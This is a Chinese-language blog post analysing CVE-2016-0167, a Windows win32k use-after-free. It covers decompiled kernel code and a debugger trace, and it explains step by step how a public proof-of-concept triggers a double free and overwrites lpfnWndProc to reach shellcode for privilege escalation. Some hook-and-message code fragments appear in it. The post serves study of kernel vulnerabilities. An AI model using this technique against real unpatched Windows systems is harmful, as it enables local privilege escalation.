<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="这篇文章主要分析了cve-2016-0167的漏洞触发过程，并分析了leeqwind的poc。cve-2016-0167是一个比较典型的windows内核uaf，调试体会漏洞利用思路的过程对学习win32k内核漏洞的利用会有一定帮助。"><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/highlight.css"><link rel="stylesheet" type="text/css" href="/css/noise.css"><title>CVE-2016-0167 | /home/5n1p3r0010</title><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Hexo 5.4.0"></head><body><article class="wrapper"><div class="post-main"><div class="nav"><nav class="container"><a class="sidebar-nav-item active" href="/">Home</a><a class="sidebar-nav-item" href="/archives">Archives</a></nav><div class="container post-meta"><div class="post-tags"><a class="post-tag-none-link" href="/tags/Windows/" rel="tag">Windows</a></div><div class="post-time">2020-12-20</div></div></div><div class="container post-header"><h1>CVE-2016-0167</h1></div><div class="container post-toc"><details class="toc"><summary class="toc-accordion">Table of Contents</summary><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F%E5%9B%9E%E8%B0%83"><span class="toc-number">2.1.</span> <span class="toc-text">1.用户模式回调</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%94%A8%E6%88%B7%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.2.</span> <span class="toc-text">2.用户对象的位置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-win32k%E7%9A%84%E5%91%BD%E5%90%8D%E7%BA%A6%E5%AE%9A"><span class="toc-number">2.3.</span> <span class="toc-text">3.win32k的命名约定</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%AF%B9%E8%B1%A1%E9%94%81"><span class="toc-number">2.4.</span> <span class="toc-text">4.对象锁</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol></details></div><div class="container post-content"><p>这篇文章主要分析了cve-2016-0167的漏洞触发过程，并分析了leeqwind的poc。cve-2016-0167是一个比较典型的windows内核uaf，调试体会漏洞利用思路的过程对学习win32k内核漏洞的利用会有一定帮助。</p>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>​    CVE-2016-0167发生在win32k!xxxMNDestroyHandler中，漏洞发生的根本原因是win32k!xxxMNDestroyHandler在释放窗口处理消息WM_UNINITMENUPOPUP时可能被回调到用户进程，在用户回调中执行自定义的挂钩函数（hook）时可能会引起窗口对象内存区域的分配或释放。在之后的分析中我们可以看到处理消息的函数win32k!xxxSendMessageTimeout在执行完用户自定义hook之后没有检查相应内存区域的有效性直接执行了一个函数回调spwndNotify-&gt;lpfnWndProc，所以漏洞的利用思路可以是利用hook double free掉窗口内存区域，然后重新分配占位窗口内存的spwndNotify-&gt;lpfnWndProc成员域来劫持控制流进而提权。</p>
<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="1-用户模式回调"><a href="#1-用户模式回调" class="headerlink" title="1.用户模式回调"></a>1.用户模式回调</h5><p>​    传统上，win32子系统是在client-server runtime subsystem (CSRSS)的基础上实现的，客户端的线程都有一个对应的服务端线程存在，他们通过fastLPC通信。后来为了提高性能，微软将大部分服务端的组件转移到了内核模式，这就引入了win32k.sys。</p>
<p>​    这样做的好处是减少了线程切换的次数和内存需求；但是和以前直接在相同特权级别直接访问代码/数据相比，用户/内核的状态转换慢。为了加快状态转换速度，微软的做法是在用户模式地址空间缓存部分数据结构；为了在内核态访问这些数据结构，需要有一种将控制权交给用户模式的方法，微软用的方法就是用户模式回调。</p>
<p>​    用户模式回调允许win32k回调到用户模式，并可以执行应用程序自定义的挂钩（hook）、事件通知、从/向用户模式拷贝数据。</p>
<h5 id="2-用户对象的位置"><a href="#2-用户对象的位置" class="headerlink" title="2.用户对象的位置"></a>2.用户对象的位置</h5><p>​    windows中每个句柄的实际位置保存在句柄类型信息表中(win32k!ghati)，这个表保存了对象的分配标志、类型、指向销毁例程的指针。当对象的引用锁计数为零时就会调用ghati中对应的销毁例程。</p>
<h5 id="3-win32k的命名约定"><a href="#3-win32k的命名约定" class="headerlink" title="3.win32k的命名约定"></a>3.win32k的命名约定</h5><p>​    为了使开发者对可能回调到用户模式的函数做出相应预防措施，win32k使用了他自己的函数命名约定。函数的前缀xxx或zzz会表明函数以何种方式调用用户模式回调。以xxx前缀命名的函数大部分会调用用户模式回调，以zzz为前缀命名的函数大部分会调用异步或延时的回调。</p>
<h5 id="4-对象锁"><a href="#4-对象锁" class="headerlink" title="4.对象锁"></a>4.对象锁</h5><p>​    windows使用锁来确保内核执行用户模式回调时对象不被改变，锁的类型一般有两种，线程锁和赋值锁。</p>
<p>​    线程锁通常用于给函数内部的对象或者缓冲区加锁。每一个线程被加锁的项存储在线程锁结构 （win32k! TL）的一个线程锁单链表。线程信息结构（THREADINFO.ptl）会指向该列表。当一个 Win32k 的函数不再需要某个对象或者缓冲区时， 它会调用 ThreadUnlock() 函数将锁项从线程锁列表中移除。</p>
<p>​    赋值锁用于对用户对象更长时间的加锁。赋值锁的对象是指向被锁对象的指针，在加赋值锁时win32k调用HMAssignmentLock(Address,Object)，释放对象赋值锁时调用HMAssignmentUnlock(Address)。</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>​    以下分析关键代码和主要逻辑。win32k!xxxMNDestroyHandler用于销毁菜单窗口的关联弹出菜单tagPOPUPMENU，win32k!xxxMNDestroyHandler首先检查了当前菜单是否包含子菜单，并遍历子菜单发送消息xxxMNCloseHierarchy执行关闭子菜单的任务。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">void __stdcall xxxMNDestroyHandler(_tagPOPUPMENU *popupmenu)</span><br><span class="line">&#123;</span><br><span class="line">  _tagWND *v1; &#x2F;&#x2F; eax</span><br><span class="line">  int v2; &#x2F;&#x2F; ecx</span><br><span class="line">  int v3; &#x2F;&#x2F; eax</span><br><span class="line">  _tagWND *spwndNotify; &#x2F;&#x2F; eax</span><br><span class="line">  _DWORD *spmenu; &#x2F;&#x2F; eax</span><br><span class="line">  _tagWND *v6; &#x2F;&#x2F; eax</span><br><span class="line">  _DWORD *v7; &#x2F;&#x2F; esi</span><br><span class="line">  _SINGLE_LIST_ENTRY *v8; &#x2F;&#x2F; [esp+4h] [ebp-Ch]</span><br><span class="line">  _tagWND *v9; &#x2F;&#x2F; [esp+8h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  if ( popupmenu )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( popupmenu-&gt;spwndNextPopup )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 &#x3D; (_tagWND *)popupmenu-&gt;spwndPopupMenu;&#x2F;&#x2F; 判断当前菜单是否存在子菜单</span><br><span class="line">      if ( !v1 )                                &#x2F;&#x2F; 不存在子菜单</span><br><span class="line">        v1 &#x3D; (_tagWND *)popupmenu-&gt;spwndNextPopup;&#x2F;&#x2F; 指向下一个菜单</span><br><span class="line">      v8 &#x3D; gptiCurrent[45].Next;</span><br><span class="line">      gptiCurrent[45].Next &#x3D; (_SINGLE_LIST_ENTRY *)&amp;v8;</span><br><span class="line">      v9 &#x3D; v1;</span><br><span class="line">      ++v1-&gt;head.cLockObj;</span><br><span class="line">      xxxSendMessage(v1, 0x1E4, 0, 0);            &#x2F;&#x2F; xxxMNCloseHierarchy，关闭子菜单</span><br><span class="line">      ThreadUnlock1();                          &#x2F;&#x2F; 关闭线程锁</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    然后检查fSendUninit标志位，其中fSendUninit是在子弹出菜单初始化时通过xxxTrackPopupMenuEx或 xxxMNOpenHierarchy被默认置位，参数spwndNotify在窗口初始化时作为用户窗口对象的地址，调用时是可控的，这将导致xxxSendMessage在处理WM_UNINITMENUPOPUP消息时有可能被回调到用户进程，漏洞也就是出现在这里。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if ( popupmenu-&gt;_union_1.fIsMenuBar &amp; 0x200000 )&#x2F;&#x2F; fSendUninit</span><br><span class="line">&#123;</span><br><span class="line">  spwndNotify &#x3D; (_tagWND *)popupmenu-&gt;spwndNotify;</span><br><span class="line">  if ( spwndNotify )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 &#x3D; gptiCurrent[45].Next;</span><br><span class="line">    gptiCurrent[45].Next &#x3D; (_SINGLE_LIST_ENTRY *)&amp;v8;</span><br><span class="line">    v9 &#x3D; spwndNotify;</span><br><span class="line">    ++spwndNotify-&gt;head.cLockObj;</span><br><span class="line">    spmenu &#x3D; (_DWORD *)popupmenu-&gt;spmenu;</span><br><span class="line">    if ( spmenu )</span><br><span class="line">      spmenu &#x3D; (_DWORD *)*spmenu;</span><br><span class="line">    xxxSendMessage(                         &#x2F;&#x2F; vul here</span><br><span class="line">      (_tagWND *)popupmenu-&gt;spwndNotify,</span><br><span class="line">      0x125,                                 &#x2F;&#x2F; WM_UNINITMENUPOPUP</span><br><span class="line">      (WCHAR)spmenu,</span><br><span class="line">      (void *)((unsigned __int16)((((unsigned int)popupmenu-&gt;_union_1.fIsMenuBar &gt;&gt; 2) &amp; 1) &lt;&lt; 13) &lt;&lt; 16));</span><br><span class="line">    ThreadUnlock1();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    win32k!xxxSendMessage中主要是给线程临界区加锁，然后执行了xxxSendMessageTimeout。xxxSendMessageTimeout中执行了一个自定义的钩子函数，然后判断接收信息窗口spwndNotify的标志位没有检查相应内存区域的有效性直接执行了一个回调函数spwndNotify-&gt;lpfnWndProc。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">if ( gptiCurrent &#x3D;&#x3D; (PSINGLE_LIST_ENTRY)spwndNotify-&gt;head.pti )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( (LOBYTE(gptiCurrent[75].Next) | LOBYTE(gptiCurrent[51].Next[3].Next)) &amp; 0x20 )</span><br><span class="line">   &#123;</span><br><span class="line">     v22 &#x3D; spwndNotify-&gt;head.h__;</span><br><span class="line">     v20 &#x3D; UnicodeString;</span><br><span class="line">     v19 &#x3D; Src;</span><br><span class="line">     v21 &#x3D; v12;</span><br><span class="line">     v23 &#x3D; 0;</span><br><span class="line">     xxxCallHook(0, 0, (int)&amp;v19, 4);        &#x2F;&#x2F; 执行回调</span><br><span class="line">   &#125;</span><br><span class="line">   if ( spwndNotify-&gt;_union_2.state &amp; 0x40000 )</span><br><span class="line">   &#123;</span><br><span class="line">     IoGetStackLimits(&amp;LowLimit, &amp;HighLimit);</span><br><span class="line">     if ( (unsigned int)&amp;HighLimit - LowLimit &lt; 0x1000 )</span><br><span class="line">       return 0;</span><br><span class="line">     result &#x3D; (_SINGLE_LIST_ENTRY *)((int (__stdcall *)(_tagWND *, int, _DWORD, void *))spwndNotify-&gt;lpfnWndProc)(&#x2F;&#x2F; 未检查相应内存区域有效性直接访问</span><br><span class="line">                                      spwndNotify,</span><br><span class="line">                                      v12,</span><br><span class="line">                                      UnicodeString,</span><br><span class="line">                                      Src);</span><br><span class="line">     if ( !pMbString )</span><br><span class="line">       return result;</span><br><span class="line">     *(_DWORD *)pMbString &#x3D; result;</span><br><span class="line">   &#125;</span><br><span class="line">     else</span><br><span class="line">   &#123;</span><br><span class="line">     xxxSendMessageToClient(spwndNotify, v12, UnicodeString, Src, 0, 0, (int)&amp;HighLimit);</span><br></pre></td></tr></table></figure>

<p>​    win32k!xxxMNDestroyHandler最后判断了fDelayedFree标志位，只有当fDelayedFree标志位为空时才会马上执行MNFreePopup，否则只清除fDelayedFree标志位。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if ( popupmenu-&gt;_union_1.fHasMenuBar &amp; 0x10000 )&#x2F;&#x2F; fDelayedFree</span><br><span class="line">&#123;</span><br><span class="line">  v7 &#x3D; (_DWORD *)popupmenu-&gt;ppopupmenuRoot;</span><br><span class="line">  if ( v7 )</span><br><span class="line">    *v7 |&#x3D; 0x20000u;                        &#x2F;&#x2F; 清除fDelayedFree标志位</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  MNFreePopup(popupmenu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    MNFreePopup首先判断当前要释放的弹出菜单是否为根菜单，若是则执行MNFlushDestroyedPopups进行释放。接着清除窗口对象成员域的赋值锁，最后释放掉窗口对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">void __stdcall MNFreePopup(_tagPOPUPMENU *P)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; eax</span><br><span class="line"></span><br><span class="line">  if ( P &#x3D;&#x3D; (_tagPOPUPMENU *)P-&gt;ppopupmenuRoot )&#x2F;&#x2F; 要释放的是当前根菜单</span><br><span class="line">    MNFlushDestroyedPopups((#162 *)P, 1);</span><br><span class="line">  v1 &#x3D; P-&gt;spwndPopupMenu;</span><br><span class="line">  if ( v1 &amp;&amp; (*(_WORD *)(v1 + 42) &amp; 0x3FFF) &#x3D;&#x3D; 668 &amp;&amp; P !&#x3D; (_tagPOPUPMENU *)&amp;gpopupMenu )</span><br><span class="line">    *(_DWORD *)(v1 + 176) &#x3D; 0;</span><br><span class="line">  HMAssignmentUnlock(&amp;P-&gt;spwndPopupMenu);       &#x2F;&#x2F; 清除赋值锁</span><br><span class="line">                                                &#x2F;&#x2F; 减小锁计数对象，锁计数为1时调用		HMUnlockObjectInternal销毁对象</span><br><span class="line">  HMAssignmentUnlock(&amp;P-&gt;spwndNextPopup);</span><br><span class="line">  HMAssignmentUnlock(&amp;P-&gt;spwndPrevPopup);</span><br><span class="line">  UnlockPopupMenu((int)P, &amp;P-&gt;spmenu);</span><br><span class="line">  UnlockPopupMenu((int)P, &amp;P-&gt;spmenuAlternate);</span><br><span class="line">  HMAssignmentUnlock(&amp;P-&gt;spwndNotify);</span><br><span class="line">  HMAssignmentUnlock(&amp;P-&gt;spwndActivePopup);</span><br><span class="line">  if ( P &#x3D;&#x3D; (_tagPOPUPMENU *)&amp;gpopupMenu )</span><br><span class="line">    gdwPUDFlags &amp;&#x3D; 0xFF7FFFFF;</span><br><span class="line">  else</span><br><span class="line">    ExFreePoolWithTag(P, 0);                    &#x2F;&#x2F; 释放对象</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中MNFlushDestroyedPopups遍历并根据链表中每个对象的fDestroyed标志位调用MNFreePopup对对象进行释放。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">for ( result &#x3D; (_tagPOPUPMENU **)((char *)a1 + 36); *result; result &#x3D; (_tagPOPUPMENU **)((char *)v2 + 36) )</span><br><span class="line">&#123;</span><br><span class="line">  v4 &#x3D; *result;</span><br><span class="line">  if ( (*result)-&gt;_union_1.fIsMenuBar &amp; 0x8000 )&#x2F;&#x2F; fDestroyed</span><br><span class="line">  &#123;</span><br><span class="line">    v5 &#x3D; *result;</span><br><span class="line">    *result &#x3D; (_tagPOPUPMENU *)v4-&gt;ppmDelayedFree;</span><br><span class="line">    MNFreePopup(v5);</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4-&gt;_union_1.fIsMenuBar &amp;&#x3D; 0xFFFEFFFF;</span><br><span class="line">    *result &#x3D; (_tagPOPUPMENU *)(*result)-&gt;ppmDelayedFree;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v2 &#x3D; (#162 *)*result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>HMAssignmentUnlock清除赋值锁的过程首先减小了对象的锁计数，在锁计数减小为0时调用HMUnlockObjectInternal销毁对象。销毁时调用win32k!ghati对应表项的销毁例程，并最终调用xxxDestroyWindow对窗口对象进行释放。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; r</span><br><span class="line"></span><br><span class="line">eax&#x3D;ff911020 ebx&#x3D;fd4425e8 ecx&#x3D;0000000c edx&#x3D;00000201 esi&#x3D;fd4425e8 edi&#x3D;924df600</span><br><span class="line"></span><br><span class="line">eip&#x3D;9238e301 esp&#x3D;90519ac4 ebp&#x3D;90519ac8 iopl&#x3D;0     nv up ei pl nz na pe nc</span><br><span class="line"></span><br><span class="line">cs&#x3D;0008 ss&#x3D;0010 ds&#x3D;0023 es&#x3D;0023 fs&#x3D;0030 gs&#x3D;0000       efl&#x3D;00000206</span><br><span class="line"></span><br><span class="line">win32k!HMDestroyUnlockedObject+0x15:</span><br><span class="line"></span><br><span class="line">9238e301 ff9118294b92  call  dword ptr win32k!gahti (924b2918)[ecx] ds:0023:924b2924&#x3D;&#123;win32k!xxxDestroyWindow (92345c1f)&#125;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>​    这里只根据leeqwind师傅的poc分析下漏洞的利用思路，poc地址<a target="_blank" rel="noopener" href="https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2016-0167/x86.cpp">https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2016-0167/x86.cpp</a></p>
<p>​    漏洞利用的过程就是一个uaf的利用过程，只不过内核的消息处理机制比较复杂，漏洞触发流程也比较复杂。总体思路是win32k!xxxMNDestroyHandler在处理WM_UNINITMENUPOPUP消息执行自定义hook函数时对窗口对象double free，double free可以在hook中通过发送MN_CANCELMENUS消息并在处理消息进入xxxMNDestroyHandler中处理WM_UNINITMENUPOPUP消息时调用DestroyWindow来实现；重新置位内存的过程可以通过发送一个WM_NCCREATE消息重新申请内存并对double free的内存spwndNotify-&gt;lpfnWndProc成员域覆盖成shellcode的地址，由于xxxSendMessageTimeout没有检查内存spwndNotify-&gt;lpfnWndProc成员域的合法性直接访问了，这样就会劫持控制流执行shellcode。</p>
<p>​    首先设置WH_CALLWNDPROC类型的自定义hook函数，并设置事件通知范围为EVENT_SYSTEM_MENUPOPUPSTART，即菜单开始弹出的事件通知。然后通过调用TrackPopupMenuEx使第一个菜单作为根菜单显示，并进入消息循环状态。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SetWindowsHookExW(WH_CALLWNDPROC, xxWindowHookProc,</span><br><span class="line">    GetModuleHandleA(NULL),</span><br><span class="line">    GetCurrentThreadId());</span><br><span class="line"></span><br><span class="line">SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART,</span><br><span class="line">    GetModuleHandleA(NULL),</span><br><span class="line">    xxWindowEventProc,</span><br><span class="line">    GetCurrentProcessId(),</span><br><span class="line">    GetCurrentThreadId(),</span><br><span class="line">    0);</span><br><span class="line"></span><br><span class="line">TrackPopupMenuEx(hMenuList[0], 0, 0, 0, hWindowMain, NULL);</span><br><span class="line"></span><br><span class="line">MSG msg &#x3D; &#123; 0 &#125;;</span><br><span class="line">while (GetMessageW(&amp;msg, NULL, 0, 0))</span><br><span class="line">&#123;</span><br><span class="line">    TranslateMessage(&amp;msg);</span><br><span class="line">    DispatchMessageW(&amp;msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    调用TrackPopupMenuEx显示菜单时会触发EVENT_SYSTEM_MENUPOPUPSTART事件通知，由于我们自定义了EVENT_SYSTEM_MENUPOPUPSTART通知的事件通知处理函数xxWindowEventProc，xxxWindowEvent在处理该通知时会进入我们自定义的xxWindowEventProc函数中，而在我们自定义的事件通知处理函数xxWindowEventProc中主要发送了三个消息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SendMessageW(hwnd, MN_SELECTITEM, 0, 0);</span><br><span class="line">SendMessageW(hwnd, MN_SELECTFIRSTVALIDITEM, 0, 0);</span><br><span class="line">PostMessageW(hwnd, MN_OPENHIERARCHY, 0, 0);</span><br></pre></td></tr></table></figure>

<p>​    在处理分发MN_OPENHIERARCHY消息时会调用xxxCreateWindowEx创建新的菜单窗口，在xxxCreateWindowEx中会调用xxxSendMessage发送WM_NCCREATE的消息，并最终调用xxxSendMessageTimeout执行xxxCallHook进入我们自定义的hook函数xxWindowHookProc中。而在xxWindowHookProc中主要是判断并根据消息的类型进入DestroyWindow或者发送MN_CANCELMENUS消息进入xxxMNCancel的流程。其中WM_UNINITMENUPOPUP消息表明这时处于第一次调用xxxMNDestroyHandler期间，这时调用DestroyWindow销毁窗口即可；WM_NCCREATE消息表明是显示完根菜单并进入事件通知处理函数xxWindowEventProc期间，这时需要发送MN_CANCELMENUS消息并进入xxxMNCancel的流程对目标窗口进行double free，xxxMNCancel会调用xxxDestroyWindow并最终调用xxxMNDestroyHandler对窗口对象进行释放。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if (cwp-&gt;message &#x3D;&#x3D; WM_UNINITMENUPOPUP &amp;&amp;</span><br><span class="line">    bEnterUninit &#x3D;&#x3D; FALSE &amp;&amp;</span><br><span class="line">    hMenuList[1] &#x3D;&#x3D; (HMENU)cwp-&gt;wParam)</span><br><span class="line">&#123;</span><br><span class="line">    DestroyWindow(hwndMenuDest);</span><br><span class="line">&#125;</span><br><span class="line">else if (cwp-&gt;message &#x3D;&#x3D; WM_NCCREATE &amp;&amp;</span><br><span class="line">    hwndMenuDest &#x3D;&#x3D; NULL &amp;&amp;</span><br><span class="line">    hwndMenuList[0] &amp;&amp; !hwndMenuList[1])</span><br><span class="line">&#123;</span><br><span class="line">    hwndMenuDest &#x3D; cwp-&gt;hwnd;</span><br><span class="line">    SendMessageW(hwndMenuList[0], MN_CANCELMENUS, 0, 0);</span><br><span class="line">    PostMessageW(hWindowMain, WM_EX_TRIGGER, 0, 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    这里需要注意的一点是如何使目标窗口fDelayedFree标志位置0进而在xxxMNDestroyHandler中直接进入MNFreePopup的流程。首先需要明确的一点是在自定义hook中调用SendMessageW发送MN_CANCELMENUS消息时，由于此时是处于消息队列处理分发WM_NCCREATE消息期间，MN_CANCELMENUS消息的处理要早于WM_NCCREATE消息，因此WM_NCCREATE要创建的子消息窗口此时并未创建成功，处理MN_CANCELMENUS消息也不会销毁任何子弹出菜单，这样子弹出菜单的fDestroyed标志位就不会被置位。</p>
<p>​    同时，在自定义hook中处理MN_CANCELMENUS消息调用xxxMNCancel销毁根菜单时，由于根菜单是被正常创建的，fDelayed标志位是置位的，xxxMNDestroyHandler不会进入MNFreePopup的流程，最终调用xxxMNEndMenuState来清理菜单结构体。</p>
<p>​    在SendMessage发送MN_CANCELMENUS消息返回后，我们异步的调用PostMessage发送自定义的消息WM_EX_TRIGGER。这时系统并不会马上执行对异步消息的处理，对WM_EX_TRIGGER消息的处理最终在窗口关联对象的消息循环xxxMNLoop中执行。</p>
<p>​    接下来内核继续进行处理WM_NCCREATE消息完成创建子菜单的操作，然后再进入xxxMNLoop消息循环中处理MN_CANCELMENUS消息。在消息循环中会判断若fDestroyed置位，则需要终止菜单，这时会跳出消息循环调用xxxEndMenuLoop终止菜单返回到xxxTrackPopupMenuEx中，xxxTrackPopupMenuEx会调用xxxMNEndMenuState来最终执行菜单终止的任务。xxxMNEndMenuState会调用MNFreePopup进而调用MNFlushDestroyedPopups来释放链表中fDestroyed未置位的对象，而上边的分析中我们已经得出子弹出菜单的fDestroyed不会被置位，因此子菜单不会被释放，且fDelayedFree标志位会被MNFlushDestroyedPopups置零。</p>
